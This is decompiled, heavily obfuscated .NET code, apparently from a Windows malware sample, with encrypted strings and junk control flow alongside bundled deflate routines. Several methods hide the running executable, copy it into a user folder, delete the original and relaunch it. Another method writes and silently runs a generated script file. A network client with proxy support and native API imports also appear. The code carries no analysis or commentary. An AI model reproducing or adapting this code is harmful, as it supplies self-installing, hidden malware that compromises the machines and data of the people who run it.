		class22_0.class23_0.short_0[int_0]++;
		return Class42.smethod_70(class22_0);
	}

	static void smethod_132(int int_0, int int_1, Class15.Class17 class17_0, byte[] byte_0)
	{
		if (class17_0.int_0 >= class17_0.int_1)
		{
			int num = int_1 + int_0;
			if (0 <= int_1)
			{
				while (int_1 <= num && num <= byte_0.Length)
				{
					if ((int_0 & 1) == 0)
					{
						goto IL_002c;
					}
					goto IL_0060;
					IL_00ab:
					class17_0.int_1 = num;
					return;
					IL_00a4:
					class17_0.int_0 = int_1;
					goto IL_00ab;
					IL_0060:
					class17_0.uint_0 |= (uint)((byte_0[int_1++] & 0xFF) << class17_0.int_2);
					class17_0.int_2 += 8;
					goto IL_002c;
					IL_002c:
					class17_0.byte_0 = byte_0;
					if (gW67GT4Mxy6wW4pIs8r())
					{
						switch (5)
						{
						case 4:
							continue;
						case 0:
						case 3:
							goto IL_009e;
						case 5:
							goto IL_00a4;
						case 6:
							goto IL_00ab;
						}
						goto IL_0060;
					}
					goto IL_00a4;
				}
			}
			throw new ArgumentOutOfRangeException();
		}
		goto IL_009e;
		IL_009e:
		throw new InvalidOperationException();
	}

	static void smethod_133(Exception exception_0, object object_0, object object_1)
	{
		Class42.smethod_2(exception_0, new object[2] { object_0, object_1 });
	}

	static Assembly smethod_134()
	{
		try
		{
			return Assembly.GetExecutingAssembly();
		}
		catch
		{
			return null;
		}
	}

	static void smethod_135(Class29 class29_0, Exception exception_0)
	{
		using (new Class43(class29_0.xmlWriter_0, Class14.smethod_0(5543)))
		{
			try
			{
				Type type = exception_0.GetType();
				class29_0.method_3(type);
				string value = Class14.smethod_0(4233);
				try
				{
					value = exception_0.Message;
				}
				catch
				{
				}
				class29_0.xmlWriter_0.WriteAttributeString(Class14.smethod_0(5556), value);
				string text = exception_0.StackTrace!.Trim();
				class29_0.xmlWriter_0.WriteAttributeString(Class14.smethod_0(5569), text);
				int num = text.IndexOf(' ');
				text = text.Substring(num + 1);
				num = text.IndexOf(Class14.smethod_0(5598));
				if (num != -1)
				{
					text = text.Substring(0, num);
				}
				class29_0.xmlWriter_0.WriteAttributeString(Class14.smethod_0(5603), text);
				class29_0.method_1(new Class33(exception_0, firstLevel: true));
			}
			catch
			{
			}
		}
	}

	static bool smethod_136(Class15.Class20 class20_0, Class15.Class17 class17_0)
	{
		int num3 = default(int);
		bool result = default(bool);
		int int_2 = default(int);
		int num4 = default(int);
		while (true)
		{
			int int_ = class20_0.int_2;
			while (true)
			{
				int num2;
				switch (int_)
				{
				case 3:
					if (class20_0.int_8 < class20_0.int_5)
					{
						int num = Class42.smethod_34(class17_0, 3);
						if (num >= 0)
						{
							Class42.smethod_99(class17_0, 3);
							class20_0.byte_0[Class15.Class20.int_9[class20_0.int_8]] = (byte)num;
							num2 = 14;
							if (TclQyZ4yUTE7ipDsBqA())
							{
							}
							goto IL_01bb;
						}
						return false;
					}
					class20_0.class19_0 = new Class15.Class19(class20_0.byte_0);
					goto IL_0235;
				case 1:
					class20_0.int_4 = Class42.smethod_34(class17_0, 5);
					if (class20_0.int_4 >= 0)
					{
						class20_0.int_4++;
						Class42.smethod_99(class17_0, 5);
						goto IL_012c;
					}
					return false;
				case 2:
					goto IL_0212;
				case 4:
					while (((num3 = Class42.smethod_106(class20_0.class19_0, class17_0)) & -16) == 0)
					{
						class20_0.byte_1[class20_0.int_8++] = (class20_0.byte_2 = (byte)num3);
						if (class20_0.int_8 == class20_0.int_6)
						{
							return true;
						}
					}
					if (num3 >= 0)
					{
						if (num3 < 17)
						{
							goto IL_0068;
						}
						num2 = 2;
						if (!TclQyZ4yUTE7ipDsBqA())
						{
							goto IL_01bb;
						}
						goto IL_0212;
					}
					return false;
				case 0:
					class20_0.int_3 = Class42.smethod_34(class17_0, 5);
					goto IL_015c;
				case 5:
					goto IL_029a;
					IL_008d:
					if (class20_0.int_5 >= 0)
					{
						class20_0.int_5 += 4;
						Class42.smethod_99(class17_0, 4);
						class20_0.byte_0 = new byte[19];
						class20_0.int_8 = 0;
						class20_0.int_2 = 3;
						goto case 3;
					}
					return false;
					IL_011c:
					class20_0.int_8++;
					goto case 3;
					IL_012c:
					class20_0.int_6 = class20_0.int_3 + class20_0.int_4;
					class20_0.byte_1 = new byte[class20_0.int_6];
					class20_0.int_2 = 2;
					goto IL_0212;
					IL_015c:
					if (class20_0.int_3 >= 0)
					{
						class20_0.int_3 += 257;
						Class42.smethod_99(class17_0, 5);
						class20_0.int_2 = 1;
						goto case 1;
					}
					return false;
					IL_0235:
					class20_0.byte_0 = null;
					class20_0.int_8 = 0;
					class20_0.int_2 = 4;
					goto case 4;
					IL_0330:
					return false;
					IL_0206:
					class20_0.byte_2 = 0;
					goto IL_0068;
					IL_0212:
					class20_0.int_5 = Class42.smethod_34(class17_0, 4);
					goto IL_008d;
					IL_0068:
					class20_0.int_7 = num3 - 16;
					class20_0.int_2 = 5;
					num2 = 3;
					if (TclQyZ4yUTE7ipDsBqA())
					{
					}
					goto IL_01bb;
					IL_01bb:
					switch (num2)
					{
					case 11:
						break;
					case 9:
						goto IL_008d;
					case 6:
					case 14:
						goto IL_011c;
					case 8:
						goto IL_012c;
					case 7:
						goto IL_015c;
					case 2:
						goto IL_0206;
					case 15:
						goto IL_0212;
					default:
						goto IL_0235;
					case 0:
						continue;
					case 3:
						goto IL_029a;
					case 5:
						goto IL_02b2;
					case 12:
					case 13:
						goto IL_0330;
					case 1:
					case 10:
					case 16:
						return result;
					}
					break;
					IL_029a:
					int_2 = Class15.Class20.int_1[class20_0.int_7];
					num4 = Class42.smethod_34(class17_0, int_2);
					goto IL_02b2;
					IL_02b2:
					if (num4 >= 0)
					{
						Class42.smethod_99(class17_0, int_2);
						num4 += Class15.Class20.int_0[class20_0.int_7];
						while (num4-- > 0)
						{
							class20_0.byte_1[class20_0.int_8++] = class20_0.byte_2;
						}
						if (class20_0.int_8 != class20_0.int_6)
						{
							class20_0.int_2 = 4;
							break;
						}
						return true;
					}
					goto IL_0330;
				}
				break;
			}
		}
	}

	static bool smethod_137(int int_0, int int_1, Class15.Class22 class22_0)
	{
		class22_0.short_0[class22_0.int_1] = (short)int_0;
		int num3 = default(int);
		while (true)
		{
			class22_0.byte_1[class22_0.int_1++] = (byte)(int_1 - 3);
			int num = 0;
			if (!TclQyZ4yUTE7ipDsBqA())
			{
				while (true)
				{
					switch (num)
					{
					default:
						class22_0.class23_1.short_0[num3]++;
						if (num3 >= 4)
						{
							num = 5;
							if (!TclQyZ4yUTE7ipDsBqA())
							{
								continue;
							}
						}
						goto end_IL_00cf;
					case 0:
					case 1:
					{
						int num2 = Class42.smethod_60(int_1 - 3, class22_0);
						class22_0.class23_0.short_0[num2]++;
						if (num2 >= 265 && num2 < 285)
						{
							class22_0.int_2 += (num2 - 261) / 4;
						}
						num3 = Class42.smethod_119(class22_0, int_0 - 1);
						goto default;
					}
					case 3:
						break;
					case 5:
						goto IL_00fd;
					case 6:
						goto end_IL_00cf;
					}
					break;
				}
				continue;
			}
			goto IL_00fd;
			IL_00fd:
			class22_0.int_2 += num3 / 2 - 1;
			break;
			continue;
			end_IL_00cf:
			break;
		}
		return Class42.smethod_70(class22_0);
	}

	static string smethod_138(string string_0)
	{
		if (string_0.StartsWith(Class14.smethod_0(5612)) && string_0.EndsWith(Class14.smethod_0(5633)))
		{
			return Class14.smethod_0(5654);
		}
		return string_0;
	}

	static int smethod_139(Class29 class29_0, Class29.Struct13 struct13_0)
	{
		string key = struct13_0.struct12_0.string_0.ToUpper();
		if (class29_0.dictionary_3.ContainsKey(key))
		{
			return class29_0.dictionary_3[key];
		}
		int count = class29_0.list_2.Count;
		class29_0.list_2.Add(struct13_0.struct12_0);
		class29_0.dictionary_3.Add(key, count);
		return count;
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static bool smethod_140(Class15.Class24 class24_0)
	{
		return class24_0.int_8 == class24_0.int_7;
	}

	static void smethod_141()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				string text4;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 704:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002f;
						case 4:
							goto IL_0056;
						case 5:
							goto IL_007d;
						case 6:
							goto IL_0095;
						case 7:
							goto IL_00ac;
						case 8:
							goto IL_00c6;
						case 9:
							goto IL_00d1;
						case 10:
							goto IL_00eb;
						case 11:
							goto IL_00fb;
						case 12:
							goto IL_0110;
						case 13:
							goto IL_0120;
						case 14:
							goto IL_013a;
						case 15:
							goto IL_014a;
						case 16:
							goto IL_0164;
						case 17:
							goto IL_0174;
						case 18:
							goto IL_0189;
						case 19:
							goto IL_0199;
						case 20:
							goto IL_01c6;
						case 21:
							goto IL_01d6;
						case 22:
							goto IL_01f0;
						case 23:
							goto IL_0200;
						case 24:
							goto IL_0215;
						case 25:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 26:
						case 27:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0215:
					num = 24;
					streamWriter.Dispose();
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(259))) + Class14.smethod_0(221);
					goto IL_002f;
					IL_002f:
					num = 3;
					text2 = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(489))) + Class14.smethod_0(4036);
					goto IL_0056;
					IL_0056:
					num = 4;
					text3 = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(188))) + Class14.smethod_0(221);
					goto IL_007d;
					IL_007d:
					num = 5;
					File.Delete(text + Class14.smethod_0(4147));
					goto IL_0095;
					IL_0095:
					num = 6;
					if (Class42.smethod_95(Class14.smethod_0(4142)))
					{
						goto end_IL_0000_3;
					}
					goto IL_00ac;
					IL_00ac:
					num = 7;
					streamWriter = new StreamWriter(text + Class14.smethod_0(5727));
					goto IL_00c6;
					IL_00c6:
					num = 8;
					streamWriter.AutoFlush = true;
					goto IL_00d1;
					IL_00d1:
					num = 9;
					streamWriter.Write(Class42.smethod_98(Class14.smethod_0(5764)));
					goto IL_00eb;
					IL_00eb:
					num = 10;
					streamWriter.Write(Environment.NewLine);
					goto IL_00fb;
					IL_00fb:
					num = 11;
					streamWriter.Write(Class14.smethod_0(5797));
					goto IL_0110;
					IL_0110:
					num = 12;
					streamWriter.Write(Environment.NewLine);
					goto IL_0120;
					IL_0120:
					num = 13;
					streamWriter.Write(Class42.smethod_98(Class14.smethod_0(5818)));
					goto IL_013a;
					IL_013a:
					num = 14;
					streamWriter.Write(Environment.NewLine);
					goto IL_014a;
					IL_014a:
					num = 15;
					streamWriter.Write(Class42.smethod_98(Class14.smethod_0(5964)));
					goto IL_0164;
					IL_0164:
					num = 16;
					streamWriter.Write(Environment.NewLine);
					goto IL_0174;
					IL_0174:
					num = 17;
					streamWriter.Write(Class14.smethod_0(5997));
					goto IL_0189;
					IL_0189:
					num = 18;
					streamWriter.Write(Environment.NewLine);
					goto IL_0199;
					IL_0199:
					num = 19;
					text4 = Class14.smethod_0(6006) + Class42.smethod_98(Class14.smethod_0(358)) + Class14.smethod_0(447);
					goto IL_01c6;
					IL_01c6:
					num = 20;
					streamWriter.Write(Environment.NewLine);
					goto IL_01d6;
					IL_01d6:
					num = 21;
					streamWriter.Write(Class42.smethod_98(Class14.smethod_0(5964)));
					goto IL_01f0;
					IL_01f0:
					num = 22;
					streamWriter.Write(Environment.NewLine);
					goto IL_0200;
					IL_0200:
					num = 23;
					streamWriter.Write(Class14.smethod_0(2531));
					goto IL_0215;
					end_IL_0000_2:
					break;
				}
				num = 25;
				Interaction.Shell(text + Class14.smethod_0(5727), (AppWinStyle)0, false, -1);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 704;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_142(Class15.Class18 class18_0)
	{
		return class18_0.int_1;
	}

	static void smethod_143()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		object executablePath = default(object);
		object obj = default(object);
		int num5 = default(int);
		UnicodeEncoding encoding = default(UnicodeEncoding);
		StreamWriter streamWriter = default(StreamWriter);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 935:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002f;
						case 4:
							goto IL_0056;
						case 5:
							goto IL_0087;
						case 6:
							goto IL_0090;
						case 8:
						case 9:
							goto IL_00b6;
						case 10:
							goto IL_00c5;
						case 11:
							goto IL_00df;
						case 12:
							goto IL_0142;
						case 14:
							goto IL_0169;
						case 15:
							goto IL_0177;
						case 16:
							goto IL_0191;
						case 13:
						case 17:
							goto IL_01a3;
						case 18:
						case 19:
							goto IL_01ac;
						case 20:
							goto IL_01ba;
						case 21:
							goto IL_01cf;
						case 22:
							goto IL_01e7;
						case 24:
							goto IL_0205;
						case 25:
							goto IL_0209;
						case 26:
							goto IL_0214;
						case 27:
							goto IL_0232;
						case 28:
							goto IL_0242;
						case 29:
							goto IL_0252;
						case 30:
							goto IL_0262;
						case 31:
							goto IL_0299;
						case 32:
							goto IL_02a9;
						case 33:
							goto IL_02b9;
						case 34:
							goto IL_02c9;
						case 35:
							goto IL_02d4;
						case 23:
						case 36:
						case 37:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
						case 38:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_02d4:
					num = 35;
					Interaction.Shell(text + Class14.smethod_0(325), (AppWinStyle)2, false, -1);
					break;
					IL_0008:
					num = 2;
					text2 = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(188))) + Class14.smethod_0(221);
					goto IL_002f;
					IL_002f:
					num = 3;
					text3 = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(489))) + Class14.smethod_0(4036);
					goto IL_0056;
					IL_0056:
					num = 4;
					text = Class14.smethod_0(187) + Interaction.Environ(Class42.smethod_98(Class14.smethod_0(259))) + Class14.smethod_0(221);
					goto IL_0087;
					IL_0087:
					num = 5;
					executablePath = Application.get_ExecutablePath();
					goto IL_0090;
					IL_0090:
					num = 6;
					if (Operators.CompareString(Application.get_ExecutablePath(), text + Class14.smethod_0(468), false) == 0)
					{
						goto end_IL_0000_3;
					}
					goto IL_00b6;
					IL_00b6:
					num = 9;
					File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
					goto IL_00c5;
					IL_00c5:
					num = 10;
					Directory.CreateDirectory(text + Class14.smethod_0(4190));
					goto IL_00df;
					IL_00df:
					num = 11;
					if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(executablePath, (object)(text + Class14.smethod_0(325)), false), Operators.CompareObjectEqual(executablePath, (object)(Interaction.Environ(Class42.smethod_98(Class14.smethod_0(188))) + Class42.smethod_98(Class14.smethod_0(358)) + Class14.smethod_0(447)), false))))
					{
						goto IL_0142;
					}
					goto IL_0205;
					IL_0142:
					num = 12;
					obj = ((ServerComputer)Class2.Computer).get_FileSystem().ReadAllText(text + Class14.smethod_0(6019));
					goto IL_01a3;
					IL_01a3:
					num = 13;
					num5 = 1;
					goto IL_0169;
					IL_0169:
					num = 14;
					Thread.Sleep(1000);
					goto IL_0177;
					IL_0177:
					num = 15;
					((ServerComputer)Class2.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
					goto IL_0191;
					IL_0191:
					num = 16;
					if (File.Exists(Conversions.ToString(obj)))
					{
						goto IL_01a3;
					}
					goto IL_01ac;
					IL_01ac:
					num = 19;
					Thread.Sleep(1500);
					goto IL_01ba;
					IL_01ba:
					num = 20;
					File.SetAttributes(Conversions.ToString(obj), FileAttributes.Normal);
					goto IL_01cf;
					IL_01cf:
					num = 21;
					File.SetAttributes(Class14.smethod_0(6044), FileAttributes.Normal);
					goto IL_01e7;
					IL_01e7:
					num = 22;
					File.Delete(text + Class14.smethod_0(6019));
					break;
					IL_0205:
					num = 24;
					goto IL_0209;
					IL_0209:
					num = 25;
					encoding = new UnicodeEncoding();
					goto IL_0214;
					IL_0214:
					num = 26;
					streamWriter = new StreamWriter(text + Class14.smethod_0(6019), append: true, encoding);
					goto IL_0232;
					IL_0232:
					num = 27;
					Conversion.Int((object)false);
					goto IL_0242;
					IL_0242:
					num = 28;
					Conversion.Int((object)false);
					goto IL_0252;
					IL_0252:
					num = 29;
					Conversion.Int((object)false);
					goto IL_0262;
					IL_0262:
					num = 30;
					File.Copy(Class14.smethod_0(187) + Application.get_ExecutablePath() + Class14.smethod_0(187), text + Class14.smethod_0(325));
					goto IL_0299;
					IL_0299:
					num = 31;
					Conversion.Int((object)false);
					goto IL_02a9;
					IL_02a9:
					num = 32;
					Conversion.Int((object)false);
					goto IL_02b9;
					IL_02b9:
					num = 33;
					streamWriter.Write(Application.get_ExecutablePath());
					goto IL_02c9;
					IL_02c9:
					num = 34;
					streamWriter.Dispose();
					goto IL_02d4;
					end_IL_0000_2:
					break;
				}
				num = 37;
				num5 = 2;
				break;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2, num5);
				try0000_dispatch = 935;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_144(Class28.Class32 class32_0, byte[] byte_0, Class28 class28_0)
	{
		Class28.Class30 class2 = default(Class28.Class30);
		while (true)
		{
			byte[] byte_;
			try
			{
				byte_ = Class42.smethod_75(byte_0);
			}
			catch (Exception)
			{
				Class42.smethod_146(class28_0, Enum1.const_0, Class15.string_0);
				return false;
			}
			byte[] array = Class42.smethod_23(byte_, Class14.smethod_0(3573));
			while (true)
			{
				IL_0094:
				if (array != null)
				{
					Class42.smethod_97(class28_0, Enum1.const_1);
					while (true)
					{
						IL_0081:
						Class40 @class = new Class40(Class14.smethod_0(6069));
						while (true)
						{
							IL_0077:
							if (class28_0.iwebProxy_0 != null)
							{
								@class.iwebProxy_0 = class28_0.iwebProxy_0;
								int num = 3;
								if (!gW67GT4Mxy6wW4pIs8r())
								{
									break;
								}
								while (true)
								{
									switch (num)
									{
									case 0:
									case 6:
										break;
									default:
										num = 2;
										if (gW67GT4Mxy6wW4pIs8r())
										{
											continue;
										}
										goto IL_0094;
									case 2:
										goto IL_0077;
									case 1:
										goto IL_0081;
									case 5:
										goto IL_0094;
									case 3:
									case 4:
										goto IL_00c2;
									case 7:
										goto IL_00e0;
									}
									break;
								}
								break;
							}
							goto IL_00c2;
							IL_00c2:
							class2 = new Class28.Class30(class28_0, array, @class, class32_0);
							Class42.smethod_55((Delegate11)class2.method_0, @class);
							goto IL_00e0;
							IL_00e0:
							return class2.bool_0;
						}
						break;
					}
					break;
				}
				Class42.smethod_146(class28_0, Enum1.const_0, Class27.string_0);
				return false;
			}
		}
	}

	static short smethod_145(int int_0)
	{
		return (short)((Class15.Class22.byte_0[int_0 & 0xF] << 12) | (Class15.Class22.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class15.Class22.byte_0[(int_0 >> 8) & 0xF] << 4) | Class15.Class22.byte_0[int_0 >> 12]);
	}

	static void smethod_146(Class28 class28_0, Enum1 enum1_0, string string_0)
	{
		Class42.smethod_113(class28_0, enum1_0, string_0, string.Empty);
	}

	static Exception smethod_147(object[] object_0, Exception exception_0)
	{
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		try
		{
			if ((object)exception_0.GetType() == typeof(Exception) && exception_0.Message == Class14.smethod_0(3547))
			{
				exception_0 = exception_0.InnerException;
			}
			else
			{
				Class42.smethod_2(exception_0, object_0);
			}
			Class38.Handler.method_3(exception_0, bool_1: true, bool_2: false);
		}
		catch
		{
		}
		return (Exception)new SoapException(exception_0.Message, SoapException.ServerFaultCode);
	}

	static void smethod_148(object object_0, string string_0, Class29 class29_0)
	{
		class29_0.dictionary_0.Add(string_0, object_0);
	}

	static void smethod_149(Class15.Class18 class18_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class18_0.byte_0[class18_0.int_0++] = class18_0.byte_0[int_0++];
			class18_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static void smethod_150()
	{
		string text = Class14.smethod_0(187);
	}

	static void smethod_151(Control0 control0_0, string string_0)
	{
		control0_0.string_0 = string_0;
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = (Image)(object)Class42.smethod_48((string_0.Length > 0) ? Class14.smethod_0(6123) : Class14.smethod_0(6118));
		control0_0.bool_1 = true;
		control0_0.bool_0 = true;
		if (string_0.Length > 0)
		{
			((Control)control0_0).set_Height(100);
		}
		((Control)control0_0).Refresh();
	}

	static void smethod_152()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text6 = default(string);
		string text7 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				object executablePath;
				string text4;
				string text5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 473:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0016;
						case 4:
							goto IL_003d;
						case 5:
							goto IL_005c;
						case 6:
							goto IL_008e;
						case 7:
							goto IL_0097;
						case 8:
							goto IL_00a5;
						case 9:
							goto IL_00d7;
						case 10:
							goto IL_00ec;
						case 11:
							goto IL_0106;
						case 12:
							goto IL_0115;
						case 13:
							goto IL_0122;
						case 14:
							goto IL_0131;
						case 15:
							goto IL_0158;
						case 16:
						case 17:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 18:
						case 19:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0158:
					num = 15;
					Conversion.Int(3405);
					break;
					IL_0008:
					num = 2;
					text = Class14.smethod_0(6132);
					goto IL_0016;
					IL_0016:
					num = 3;
					text2 = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(188))) + Class14.smethod_0(221);
					goto IL_003d;
					IL_003d:
					num = 4;
					if (Operators.CompareString(text, Class42.smethod_98(Class14.smethod_0(4104)), false) != 0)
					{
						goto end_IL_0000_3;
					}
					goto IL_005c;
					IL_005c:
					num = 5;
					text3 = Class14.smethod_0(187) + Interaction.Environ(Class42.smethod_98(Class14.smethod_0(259))) + Class14.smethod_0(221);
					goto IL_008e;
					IL_008e:
					num = 6;
					executablePath = Application.get_ExecutablePath();
					goto IL_0097;
					IL_0097:
					num = 7;
					text4 = Class14.smethod_0(6149);
					goto IL_00a5;
					IL_00a5:
					num = 8;
					text5 = Class14.smethod_0(187) + Interaction.Environ(Class42.smethod_98(Class14.smethod_0(489))) + Class14.smethod_0(4036);
					goto IL_00d7;
					IL_00d7:
					num = 9;
					text6 = Class42.smethod_98(Class14.smethod_0(6166));
					goto IL_00ec;
					IL_00ec:
					num = 10;
					text7 = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(489)));
					goto IL_0106;
					IL_0106:
					num = 11;
					Conversion.Int(3405);
					goto IL_0115;
					IL_0115:
					num = 12;
					if (Class42.smethod_95(text6))
					{
						break;
					}
					goto IL_0122;
					IL_0122:
					num = 13;
					Conversion.Int(3405);
					goto IL_0131;
					IL_0131:
					num = 14;
					Process.Start(text7 + Class14.smethod_0(221) + text6 + Class14.smethod_0(6199));
					goto IL_0158;
					end_IL_0000_2:
					break;
				}
				num = 17;
				Conversion.Int(3405);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 473;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32.Dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long QueueUserWorkItem(long long_0, ref long long_1, long long_2);

	static void smethod_153(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_0 = true;
	}

	static bool smethod_154(string string_0)
	{
		Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Application.get_ExecutablePath()));
		Process[] array = processesByName;
		int num = 0;
		bool result = default(bool);
		if (0 >= array.Length)
		{
			return result;
		}
		Process process = array[num];
		if (process == null)
		{
			return false;
		}
		return true;
	}

	static void smethod_155(int int_0, int int_1, byte[] byte_0, Class15.Class18 class18_0)
	{
		if (class18_0.int_1 > 0)
		{
			throw new InvalidOperationException();
		}
		if (int_0 > 32768)
		{
			int_1 += int_0 - 32768;
			int_0 = 32768;
		}
		Array.Copy(byte_0, int_1, class18_0.byte_0, 0, int_0);
		class18_0.int_0 = int_0 & 0x7FFF;
	}

	static bool smethod_156(int int_0, Class15.Class24 class24_0)
	{
		int num = 128;
		int num2 = 128;
		int num8 = default(int);
		while (true)
		{
			short[] short_ = class24_0.short_1;
			int num3 = class24_0.int_4;
			int num4 = class24_0.int_4 + class24_0.int_2;
			int num5 = Math.Max(class24_0.int_2, 2);
			while (true)
			{
				IL_0259:
				int num6 = Math.Max(class24_0.int_4 - 32506, 0);
				int num7 = class24_0.int_4 + 258 - 1;
				byte b = class24_0.byte_0[num4 - 1];
				byte b2 = class24_0.byte_0[num4];
				if (num5 >= 8)
				{
					goto IL_024a;
				}
				goto IL_024e;
				IL_024e:
				if (num2 > class24_0.int_5)
				{
					goto IL_01f3;
				}
				goto IL_023b;
				IL_023b:
				while (true)
				{
					if (class24_0.byte_0[int_0 + num5] == b2 && class24_0.byte_0[int_0 + num5 - 1] == b && class24_0.byte_0[int_0] == class24_0.byte_0[num3] && class24_0.byte_0[int_0 + 1] == class24_0.byte_0[num3 + 1])
					{
						goto IL_006d;
					}
					goto IL_01d7;
					IL_007d:
					if (class24_0.byte_0[++num3] == class24_0.byte_0[++num8] && class24_0.byte_0[++num3] == class24_0.byte_0[++num8] && class24_0.byte_0[++num3] == class24_0.byte_0[++num8])
					{
						goto IL_00e0;
					}
					goto IL_0188;
					IL_018e:
					class24_0.int_1 = int_0;
					goto IL_0195;
					IL_0195:
					num4 = num3;
					num5 = num3 - class24_0.int_4;
					if (num5 >= num2)
					{
						goto IL_0011;
					}
					b = class24_0.byte_0[num4 - 1];
					b2 = class24_0.byte_0[num4];
					goto IL_01c1;
					IL_01d7:
					if ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > num6 && --num != 0)
					{
						continue;
					}
					goto IL_0011;
					IL_00e0:
					if (class24_0.byte_0[++num3] == class24_0.byte_0[++num8] && class24_0.byte_0[++num3] == class24_0.byte_0[++num8] && class24_0.byte_0[++num3] == class24_0.byte_0[++num8] && num3 < num7)
					{
						goto IL_0168;
					}
					goto IL_0188;
					IL_0011:
					class24_0.int_2 = Math.Min(num5, class24_0.int_5);
					if (TclQyZ4yUTE7ipDsBqA())
					{
					}
					switch (12)
					{
					case 7:
						break;
					case 8:
						goto IL_007d;
					case 1:
						goto IL_00e0;
					default:
						goto IL_0168;
					case 3:
						goto IL_018e;
					case 9:
					case 10:
						goto IL_0195;
					case 6:
						goto end_IL_023b;
					case 2:
					case 11:
						goto IL_024a;
					case 4:
						goto IL_0259;
					case 0:
						goto end_IL_0259;
					case 12:
						return class24_0.int_2 >= 3;
					}
					goto IL_006d;
					IL_0188:
					if (num3 > num4)
					{
						goto IL_018e;
					}
					goto IL_01c1;
					IL_006d:
					num8 = int_0 + 2;
					num3 += 2;
					goto IL_0168;
					IL_0168:
					if (class24_0.byte_0[++num3] == class24_0.byte_0[++num8] && class24_0.byte_0[++num3] == class24_0.byte_0[++num8])
					{
						goto IL_007d;
					}
					goto IL_0188;
					IL_01c1:
					num3 = class24_0.int_4;
					goto IL_01d7;
					continue;
					end_IL_023b:
					break;
				}
				goto IL_01f3;
				IL_024a:
				num >>= 2;
				goto IL_024e;
